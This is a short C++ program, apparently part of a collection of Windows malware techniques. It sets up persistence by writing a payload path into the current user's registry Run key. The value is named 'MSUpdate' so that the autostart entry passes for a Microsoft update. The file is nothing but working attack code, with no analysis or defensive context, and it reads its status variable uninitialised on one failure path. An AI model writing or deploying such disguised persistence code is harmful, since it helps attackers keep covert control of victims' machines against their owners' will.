// Author: Nemuel Wainaina

#include <iostream>
#include <windows.h>

int main() {
    HKEY hKey = NULL;
    LONG result;
    const wchar_t* payload = L"C:\\Users\\Nemuel\\Desktop\\Windows-Malware-Techniques\\persistence\\registry-run-keys\\payload.exe";

    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        result = RegSetValueExW(hKey, L"MSUpdate", 0, REG_SZ, reinterpret_cast<const BYTE*>(payload), (wcslen(payload)+1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }

    if (result == ERROR_SUCCESS) {
        std::cout << "Persistence established successfully" << std::endl;
    } else {
        std::cout << "Persistence attempt failed" << std::endl;
    }

    return 0;
}
